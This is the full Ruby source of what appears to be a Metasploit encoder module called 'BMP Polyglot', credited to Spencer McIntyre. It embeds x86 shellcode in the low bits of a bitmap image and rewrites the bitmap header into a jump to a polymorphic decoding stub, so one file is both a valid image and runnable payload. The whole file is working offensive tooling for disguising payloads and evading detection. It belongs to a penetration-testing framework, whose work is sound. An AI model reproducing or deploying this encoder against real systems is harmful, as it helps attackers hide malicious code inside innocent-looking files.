##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/poly'
=begin
[BITS 32]

global _start

_start:
  pushad                ; backup all registers

  call get_eip          ; get the value of eip
get_eip:
  pop esi               ; and put it into esi to use as the source
  add esi, 0x30         ; advance esi to skip this decoder stub
  mov edi, esi          ; copy it to edi which is where to start writing
  add esi, 0x1234       ; increase the source to skip any padding
  mov ecx, 0x1234       ; set the byte counter

get_byte:               ; <---------------------------------------------------------\
  xor eax, eax          ; clear eax which is where our newly decoded byte will go   |
  push ecx              ; preserve the byte counter                                 |
  xor ecx, ecx          ; set the counter to 0                                      |
  mov cl, 8             ; set the counter to 8 (for bits)                           |
get_bit:                ; <------------------------------------------------------\  |
  shl eax, 1            ; shift eax one to make room for the next bit            |  |
  mov bl, byte [esi]    ; read a byte from the source register                   |  |
  inc esi               ; advance the source register by a byte                  |  |
  and bl, 1             ; extract the value of the least-significant bit         |  |
  or al, bl             ; put the least-significat bit into eax                  |  |
  dec ecx               ; decrement the bit counter                              |  |
  jne short get_bit     ; -------------------------------------------------------/  |
                        ;                                                           |
  ; get bit loop is done                                                            |
  pop ecx               ; restore the byte counter                                  |
  mov byte [edi], al    ; move the newly decoded byte to its final destination      |
  inc edi               ; increment the destination pointer                         |
                        ;                                                           |
  dec ecx               ; decrement the byte counter                                |
  jne get_byte          ; ----------------------------------------------------------/

  ; get byte loop is done
  popad                 ; restore all registers

=end

# calculate the smallest increase of a 32-bit little endian integer which is
# also a valid x86 jmp opcode of the specified minimum size.
class SizeCalculator

  BYTE_NOPS = [
    0x42, # inc edx
    0x45, # inc ebp
    0x4a, # dec edx
    0x4d, # dec ebp
    0x90, # xchg eax, eax / nop
    0xf5, # cmc
    0xf8, # clc
    0xf9, # stc
    0xfc, # cld
    0xfd  # std
  ]

  def initialize(size, minimum_jump)
    @original_size = size
    raise if minimum_jump < 0 || minimum_jump > 0xff
    @minimum_jump = minimum_jump
  end

  def calculate
    possibles = []
    size = new_size_long
    possibles << size unless size.nil?
    size = new_size_short
    possibles << size unless size.nil?
    return if possibles.length == 0
    possibles.min
  end

  def new_size_long
    size = [ @original_size ].pack('V').unpack('CCCC')

    0.upto(2) do |i|
      byte_0 = size[i]
      byte_1 = size[i + 1]
      byte_2 = size[i + 2].to_i
      byte_3 = size[i + 3].to_i
      byte_4 = size[i + 4].to_i
      min_jmp = (@minimum_jump - 5 - i)

      if byte_2 + byte_3 + byte_4 > 0  # this jmp would be too large
        if byte_0 > 0xfd
          size = increment_size(size, i)
        end
        size[i] = round_up_to_nop(byte_0)
        next
      end

      if byte_0 > 0xe9
        if byte_0 > 0xfd
          size = increment_size(size, i)
        end
        size[i] = round_up_to_nop(byte_0)
      else
        size[i] = 0xe9
        byte_1 = min_jmp if byte_1 < min_jmp
        size[i + 1] = byte_1
        return size.pack('CCCC').unpack('V')[0]
      end
    end
  end

  def new_size_short
    return if @minimum_jump > 0x81  # short won't make it in this case (0x7f + 0.upto(2).to_a.max)
    size = [ @original_size ].pack('V').unpack('CCCC')

    0.upto(2) do |i|
      byte_0 = size[i]
      byte_1 = size[i + 1]
      min_jmp = (@minimum_jump - 2 - i)

      if byte_0 > 0xeb
        if byte_0 > 0xfd
          size = increment_size(size, i)
        end
        size[i] = round_up_to_nop(byte_0)
      else
        size[i] = 0xeb
        if byte_1 > 0x7f
          byte_1 = min_jmp
          size = increment_size(size, i + 1)
        elsif byte_1 < min_jmp
          byte_1 = min_jmp
        end
        size[i + 1] = byte_1
        return size.pack('CCCC').unpack('V')[0]
      end
    end
  end

  def size_to_jmp(size)
    jmp = 0
    packed = [ size, 0 ].pack('VV')

    until [ "\xe9", "\xeb" ].include?(packed[0])
      packed = packed[1..-1]
      jmp += 1
    end

    if packed[0] == "\xe9"
      jmp +=  packed[1..4].unpack('V')[0]
      jmp += 5
    elsif packed[0] == "\xeb"
      jmp += packed[1].unpack('C')[0]
      jmp += 2
    end

    jmp
  end

  private

  def increment_size(size, byte)
    size = size.pack('CCCC').unpack('V')[0]
    size += (0x0100 << byte * 8)
    [ size ].pack('V').unpack('CCCC')
  end

  def round_up_to_nop(opcode)
    BYTE_NOPS.find { |nop| opcode <= nop }
  end
end

class MetasploitModule < Msf::Encoder
  Rank = ManualRanking

  DESTEGO_STUB_SIZE = 53
  # bitmap header sizes
  BM_HEADER_SIZE = 14
  DIB_HEADER_SIZE = 40

  def initialize
    super(
      'Name'             => 'BMP Polyglot',
      'Description'      => %q{
        Encodes a payload in such a way that the resulting binary blob is both
        valid x86 shellcode and a valid bitmap image file (.bmp). The selected
        bitmap file to inject into must use the BM (Windows 3.1x/95/NT) header
        and the 40-byte Windows 3.1x/NT BITMAPINFOHEADER. Additionally the file
        must use either 24 or 32 bits per pixel as the color depth and no
        compression. This encoder makes absolutely no effort to remove any
        invalid characters.
      },
      'Author'           => 'Spencer McIntyre',
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE,
      'References'       =>
        [
          [ 'URL'        => 'https://warroom.securestate.com/bmp-x86-polyglot/' ]
        ]
    )

    register_options(
      [
        OptString.new('BitmapFile', [ true, 'The .bmp file to inject into' ])
      ],
      self.class)
  end

  def can_preserve_registers?
    true
  end

  def preserves_stack?
    true
  end

  def make_pad(size)
    (0...size).map { (rand(0x100)).chr }.join
  end

  def modified_registers
    # these two registers are modified by the initial BM header
    #   B 0x42 inc edx
    #   M 0x4d dec ebp
    [
      Rex::Arch::X86::EBP, Rex::Arch::X86::EDX
    ]
  end

  # take the original size and calculate a new one that meets the following
  # requirements:
  #   - large enough to store all of the image data and the assembly stub
  #   - is also a valid x86 jmp instruction to land on the assembly stub
  def calc_new_size(orig_size, stub_length)
    minimum_jump = BM_HEADER_SIZE + DIB_HEADER_SIZE - 2  # -2 for the offset of the size in the BM header
    calc = SizeCalculator.new(orig_size + stub_length, minimum_jump)
    size = calc.calculate.to_i
    raise EncodingError, 'Bad .bmp, failed to calculate jmp for size' if size < orig_size

    jump = calc.size_to_jmp(size)
    pre_pad = jump - minimum_jump
    post_pad = size - orig_size - stub_length - pre_pad
    return { :new_size => size, :post_pad => post_pad, :pre_pad => pre_pad }
  end

  # calculate the least number of bits that must be modified to place the
  # shellcode buffer into the image data
  def calc_required_lsbs(sc_len, data_len)
    return 1 if sc_len * 8 <= data_len
    return 2 if sc_len * 4 <= data_len
    return 4 if sc_len * 2 <= data_len
    raise EncodingError, 'Bad .bmp, not enough image data for stego operation'
  end

  # asm stub that will extract the payload from the least significant bits of
  # the binary data which directly follows it
  def make_destego_stub(shellcode_size, padding, lsbs = 1)
    raise RuntimeError, 'Invalid number of storage bits' unless [1, 2, 4].include?(lsbs)
    gen_regs = [ 'eax', 'ebx', 'ecx', 'edx' ].shuffle
    ptr_regs = [ 'edi', 'esi' ].shuffle
    # declare logical registers
    dst_addr_reg = Rex::Poly::LogicalRegister::X86.new('dst_addr', ptr_regs.pop)
    src_addr_reg = Rex::Poly::LogicalRegister::X86.new('src_addr', ptr_regs.pop)
    ctr_reg = Rex::Poly::LogicalRegister::X86.new('ctr', gen_regs.pop)
    byte_reg = Rex::Poly::LogicalRegister::X86.new('byte', gen_regs.pop)
    bit_reg = Rex::Poly::LogicalRegister::X86.new('bit', gen_regs.pop)

    endb = Rex::Poly::SymbolicBlock::End.new

    get_eip_nop = Proc.new { |b| [0x90, 0x40 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample), 0x48 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)].sample.chr }
    get_eip = Proc.new { |b|
      [
        Proc.new { |b| "\xe8" + [0, 1].sample.chr + "\x00\x00\x00" + get_eip_nop.call(b) + (0x58 + b.regnum_of(src_addr_reg)).chr },
        Proc.new { |b| "\xe8\xff\xff\xff\xff" + (0xc0 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)).chr + (0x58 + b.regnum_of(src_addr_reg)).chr },
      ].sample.call(b)
    }
    set_src_addr = Proc.new { |b, o| "\x83" + (0xc0 + b.regnum_of(src_addr_reg)).chr + [ b.offset_of(endb) + o ].pack('c') }
    set_dst_addr = Proc.new { |b| "\x89" + (0xc0 + (b.regnum_of(src_addr_reg) << 3) + b.regnum_of(dst_addr_reg)).chr }
    set_byte_ctr = Proc.new { |b| (0xb8 + b.regnum_of(ctr_reg)).chr + [ shellcode_size ].pack('V') }
    adjust_src_addr = Proc.new { |b| "\x81" + (0xc0 + b.regnum_of(src_addr_reg)).chr + [ padding ].pack('V') }
    initialize = Rex::Poly::LogicalBlock.new('initialize',
      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) + set_byte_ctr.call(b) },
      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_dst_addr.call(b) + set_byte_ctr.call(b) + adjust_src_addr.call(b) },
      Proc.new { |b| "\x60" + get_eip.call(b) + set_src_addr.call(b, -6) + set_byte_ctr.call(b) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
      Proc.new { |b| "\x60" + get_eip.call(b) + set_byte_ctr.call(b) + set_src_addr.call(b,  -6) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
      Proc.new { |b| "\x60" + set_byte_ctr.call(b) + get_eip.call(b) + set_src_addr.call(b, -11) + set_dst_addr.call(b) + adjust_src_addr.call(b) },
    )

    clr_byte_reg = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(byte_reg) << 3) + b.regnum_of(byte_reg)).chr }
    clr_ctr = Proc.new { |b| [0x29, 0x2b, 0x31, 0x33].sample.chr + (0xc0 + (b.regnum_of(ctr_reg) << 3) + b.regnum_of(ctr_reg)).chr }
    backup_byte_ctr = Proc.new { |b| (0x50 + b.regnum_of(ctr_reg)).chr }
    set_bit_ctr = Proc.new { |b| (0xb0 + b.regnum_of(ctr_reg)).chr + (8 / lsbs).chr }
    get_byte_loop = Rex::Poly::LogicalBlock.new('get_byte_loop',
      Proc.new { |b| clr_byte_reg.call(b) + backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
      Proc.new { |b| backup_byte_ctr.call(b) + clr_byte_reg.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) },
      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + clr_byte_reg.call(b) + set_bit_ctr.call(b) },
      Proc.new { |b| backup_byte_ctr.call(b) + clr_ctr.call(b) + set_bit_ctr.call(b) + clr_byte_reg.call(b) },
    )
    get_byte_loop.depends_on(initialize)

    shift_byte_reg = Rex::Poly::LogicalBlock.new('shift_byte_reg',
      Proc.new { |b| "\xc1" + (0xe0 + b.regnum_of(byte_reg)).chr + lsbs.chr }
    )
    read_byte = Rex::Poly::LogicalBlock.new('read_byte',
      Proc.new { |b| "\x8a" + ((b.regnum_of(bit_reg) << 3) + b.regnum_of(src_addr_reg)).chr }
    )
    inc_src_reg = Rex::Poly::LogicalBlock.new('inc_src_reg',
      Proc.new { |b| (0x40 + b.regnum_of(src_addr_reg)).chr }
    )
    inc_src_reg.depends_on(read_byte)
    get_lsb = Rex::Poly::LogicalBlock.new('get_lsb',
      Proc.new { |b| "\x80" + (0xe0 + b.regnum_of(bit_reg)).chr + (0xff >> (8 - lsbs)).chr }
    )
    get_lsb.depends_on(read_byte)
    put_lsb = Rex::Poly::LogicalBlock.new('put_lsb',
      Proc.new { |b| "\x08"+ (0xc0 + (b.regnum_of(bit_reg) << 3) + b.regnum_of(byte_reg)).chr }
    )
    put_lsb.depends_on(get_lsb, shift_byte_reg)
    jmp_bit_loop_body = Rex::Poly::LogicalBlock.new('jmp_bit_loop_body')
    jmp_bit_loop_body.depends_on(put_lsb, inc_src_reg)

    jmp_bit_loop = Rex::Poly::LogicalBlock.new('jmp_bit_loop',
      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -12).chr }
    )
    jmp_bit_loop.depends_on(jmp_bit_loop_body)

    get_bit_loop = Rex::Poly::LogicalBlock.new('get_bit_loop_body', jmp_bit_loop.generate([ Rex::Arch::X86::EBP, Rex::Arch::X86::ESP ]))
    get_bit_loop.depends_on(get_byte_loop)

    put_byte = Proc.new { |b| "\x88" + (0x00 + (b.regnum_of(byte_reg) << 3) + b.regnum_of(dst_addr_reg)).chr }
    inc_dst_reg = Proc.new { |b| (0x40 + b.regnum_of(dst_addr_reg)).chr }
    restore_byte_ctr = Proc.new { |b| (0x58 + b.regnum_of(ctr_reg)).chr }
    get_byte_post = Rex::Poly::LogicalBlock.new('get_byte_post',
      Proc.new { |b| put_byte.call(b) + inc_dst_reg.call(b) + restore_byte_ctr.call(b) },
      Proc.new { |b| put_byte.call(b) + restore_byte_ctr.call(b) + inc_dst_reg.call(b) },
      Proc.new { |b| restore_byte_ctr.call(b) + put_byte.call(b) + inc_dst_reg.call(b) },
    )
    get_byte_post.depends_on(get_bit_loop)

    jmp_byte_loop_body = Rex::Poly::LogicalBlock.new('jmp_byte_loop_body',
      Proc.new { |b| (0x48 + b.regnum_of(ctr_reg)).chr + "\x75" + (0xfe + -26).chr  }
    )
    jmp_byte_loop_body.depends_on(get_byte_post)

    finalize = Rex::Poly::LogicalBlock.new('finalize', "\x61")
    finalize.depends_on(jmp_byte_loop_body)

    return finalize.generate([ Rex::Arch::X86::EBP, Rex::Arch::X86::ESP ])
  end

  def stegoify(shellcode, data, lsbs = 1)
    clr_mask = ((0xff << lsbs) & 0xff)
    set_mask = clr_mask ^ 0xff
    iter_count = 8 / lsbs

    shellcode.each_char.with_index do |sc_byte, index|
      sc_byte = sc_byte.ord
      0.upto(iter_count - 1) do |bit_pos|
        data_pos = (index * (8 / lsbs)) + bit_pos
        shift = 8 - (lsbs * (bit_pos + 1))

        d_byte = data[data_pos].ord
        d_byte &= clr_mask
        d_byte |= ((sc_byte & (set_mask << shift)) >> shift)
        data[data_pos] = d_byte.chr
      end
    end

    data
  end

  def validate_dib_header(dib_header)
    size, _, _, _, bbp, compression, _, _, _, _, _ = dib_header.unpack('VVVvvVVVVVV')
    raise EncodingError, 'Bad .bmp DIB header, must be 40-byte BITMAPINFOHEADER' if size != DIB_HEADER_SIZE
    raise EncodingError, 'Bad .bmp DIB header, bits per pixel must be must be either 24 or 32' if bbp != 24 && bbp != 32
    raise EncodingError, 'Bad .bmp DIB header, compression can not be used' if compression != 0
  end

  def encode(buf, badchars = nil, state = nil, platform = nil)
    in_bmp = File.open(datastore['BitmapFile'], 'rb')

    header = in_bmp.read(BM_HEADER_SIZE)
    dib_header = in_bmp.read(DIB_HEADER_SIZE)
    image_data = in_bmp.read
    in_bmp.close

    header, original_size, _, _, original_offset = header.unpack('vVvvV')
    raise EncodingError, 'Bad .bmp header, must be 0x424D (BM)' if header != 0x4d42
    validate_dib_header(dib_header)

    lsbs = calc_required_lsbs(buf.length, image_data.length)

    details = calc_new_size(original_size, DESTEGO_STUB_SIZE)
    destego_stub = make_destego_stub(buf.length, details[:post_pad], lsbs)
    if destego_stub.length != DESTEGO_STUB_SIZE
      # this is likely a coding error caused by updating the make_destego_stub
      # method but not the DESTEGO_STUB_SIZE constant
      raise EncodingError, 'Bad destego stub size'
    end

    pre_image_data = make_pad(details[:pre_pad]) + destego_stub + make_pad(details[:post_pad])
    new_offset = original_offset + pre_image_data.length

    bmp_img = ''
    bmp_img << [0x4d42, details[:new_size], 0, 0, new_offset].pack('vVvvV')
    bmp_img << dib_header
    bmp_img << pre_image_data
    bmp_img << stegoify(buf, image_data, lsbs)
    bmp_img
  end
end
